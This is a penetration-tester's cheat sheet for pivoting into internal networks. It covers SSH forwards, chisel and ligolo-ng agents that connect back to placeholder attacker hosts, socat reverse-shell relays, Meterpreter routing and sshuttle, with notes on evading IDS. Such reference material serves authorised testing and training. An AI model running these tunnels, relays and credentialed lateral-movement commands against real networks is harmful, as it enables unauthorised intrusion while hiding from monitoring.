# Pivoting and Tunneling Reference

## SSH Port Forwarding

### Local Port Forward (-L)
Route traffic through SSH to reach internal hosts.
```
# Syntax: ssh -L <local_port>:<target>:<target_port> user@jumphost

# Access internal web server
ssh -L 8080:10.10.10.5:80 user@jumphost
# Now: curl http://localhost:8080 → reaches 10.10.10.5:80

# Access internal RDP
ssh -L 3389:10.10.10.5:3389 user@jumphost
xfreerdp /v:localhost:3389 /u:admin /p:pass

# Access internal SMB
ssh -L 445:10.10.10.5:445 user@jumphost
# Note: local port 445 may need root

# Multiple forwards in one session
ssh -L 8080:10.10.10.5:80 -L 8443:10.10.10.5:443 -L 3389:10.10.10.10:3389 user@jumphost

# Background the tunnel
ssh -f -N -L 8080:10.10.10.5:80 user@jumphost
# -f = background after auth, -N = no remote command
```

### Remote Port Forward (-R)
Expose your local service to the remote host (or their network).
```
# Syntax: ssh -R <remote_port>:<target>:<target_port> user@jumphost

# Expose your attacker HTTP server to pivot network
ssh -R 8080:localhost:80 user@jumphost
# jumphost:8080 → your localhost:80

# Expose reverse shell listener
ssh -R 4444:localhost:4444 user@jumphost
# Internal hosts connect to jumphost:4444 → your nc listener
```

### Dynamic SOCKS Proxy (-D)
Create a SOCKS proxy to route any traffic through the tunnel.
```
# Create SOCKS5 proxy
ssh -D 1080 user@jumphost
ssh -f -N -D 1080 user@jumphost    # Background

# Configure proxychains (/etc/proxychains4.conf)
# [ProxyList]
# socks5 127.0.0.1 1080

# Use with any tool
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.5
proxychains impacket-psexec domain/user:pass@10.10.10.5
proxychains evil-winrm -i 10.10.10.5 -u user -p pass

# Or use with nmap directly (SOCKS via --proxies)
nmap --proxies socks5://127.0.0.1:1080 -sT -Pn 10.10.10.5
```

---

## Chisel (HTTP-Based Tunnel)

### Setup
```
# Transfer chisel binary to pivot host
# Linux: chisel_linux_amd64
# Windows: chisel_windows_amd64.exe
```

### Reverse SOCKS Proxy (most common)
```
# Attacker — start server
chisel server --reverse --port 8080

# Pivot host — connect back as client, create reverse SOCKS
chisel client <ATTACKER_IP>:8080 R:1080:socks
# Windows: chisel.exe client <ATTACKER_IP>:8080 R:1080:socks

# Now on attacker: proxychains through localhost:1080
proxychains nmap -sT -Pn 10.10.10.0/24
```

### Forward Specific Ports
```
# Attacker server
chisel server --reverse --port 8080

# Forward internal port to attacker
chisel client <ATTACKER_IP>:8080 R:445:10.10.10.5:445
chisel client <ATTACKER_IP>:8080 R:3389:10.10.10.5:3389
chisel client <ATTACKER_IP>:8080 R:5985:10.10.10.5:5985

# Multiple forwards
chisel client <ATTACKER_IP>:8080 R:445:10.10.10.5:445 R:3389:10.10.10.5:3389
```

### Double Pivot
```
# Attacker → Pivot1 → Pivot2 → Target
# 1. Chisel server on attacker
chisel server --reverse --port 8080

# 2. Chisel client on Pivot1 → SOCKS to attacker
chisel client <ATTACKER>:8080 R:1080:socks

# 3. Through SOCKS, upload chisel to Pivot2
# 4. Run new chisel server on different port on attacker
chisel server --reverse --port 8081

# 5. Chisel client on Pivot2 through Pivot1's tunnel
proxychains chisel client <ATTACKER>:8081 R:2080:socks

# 6. Chain proxychains: socks5 127.0.0.1 1080 → socks5 127.0.0.1 2080
```

---

## Ligolo-ng (TUN Interface — Full Network Access)

### Setup (no proxychains needed!)
```
# 1. Create TUN interface on attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Start proxy on attacker
ligolo-proxy -selfcert

# 3. Transfer agent to pivot host and run
# Linux:
./ligolo-agent -connect <ATTACKER_IP>:11601 -ignore-cert
# Windows:
ligolo-agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

### Usage
```
# In ligolo-proxy console:
>> session                           # Select agent session
>> ifconfig                          # View pivot host interfaces
>> start                             # Start tunnel

# Add route on attacker for internal network
sudo ip route add 10.10.10.0/24 dev ligolo

# Now access internal network DIRECTLY — no proxychains!
nmap -sT -Pn 10.10.10.0/24
evil-winrm -i 10.10.10.5 -u user -p pass
impacket-psexec domain/user:pass@10.10.10.5
xfreerdp /v:10.10.10.5 /u:user /p:pass
```

### Listener (Reverse Connections Through Tunnel)
```
# In ligolo console:
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Internal hosts connecting to pivot:4444 → your localhost:4444
```

---

## Socat Relays

### Simple Port Forward
```
# Forward local port to remote target
socat TCP-LISTEN:8080,fork TCP:<TARGET>:80
socat TCP-LISTEN:445,fork TCP:<TARGET>:445

# With encryption
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:<TARGET>:80
```

### Reverse Shell Relay
```
# On pivot — relay reverse shell to attacker
socat TCP-LISTEN:4444,fork TCP:<ATTACKER>:4444
# Payload on target connects to pivot:4444 → forwarded to attacker:4444
```

---

## Meterpreter Pivoting

### Autoroute
```
# In Meterpreter session
run autoroute -s 10.10.10.0/24          # Add route
run autoroute -p                          # Print routes
run autoroute -d -s 10.10.10.0/24       # Delete route
```

### SOCKS Proxy
```
# Start SOCKS4a proxy in Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 1080
set SRVHOST 0.0.0.0
set VERSION 5
run -j

# Configure proxychains
# socks5 127.0.0.1 1080

# Port forward specific ports
portfwd add -l 8080 -p 80 -r 10.10.10.5
portfwd add -l 3389 -p 3389 -r 10.10.10.5
portfwd list
portfwd delete -l 8080 -p 80 -r 10.10.10.5
```

---

## sshuttle (Transparent VPN)

```
# Route entire subnet through SSH (no proxychains needed)
sshuttle -r user@jumphost 10.10.10.0/24

# Include DNS routing
sshuttle -r user@jumphost 10.10.10.0/24 --dns

# Multiple subnets
sshuttle -r user@jumphost 10.10.10.0/24 172.16.0.0/16

# Exclude specific hosts
sshuttle -r user@jumphost 10.10.10.0/24 -x 10.10.10.1

# With SSH key
sshuttle -r user@jumphost 10.10.10.0/24 -e 'ssh -i /path/to/key'
```

---

## OPSEC Notes
- SSH tunnels are encrypted — content invisible to IDS
- Chisel HTTP traffic may trigger on unusual User-Agent or traffic patterns
- Ligolo-ng TUN traffic appears as direct connections — most natural looking
- Socat relays are plain TCP — visible to network monitoring
- sshuttle requires Python on jumphost — may not always be available
- Proxychains only works with TCP — no UDP/ICMP support
- Multiple pivots add latency — expect slower scanning through deep chains
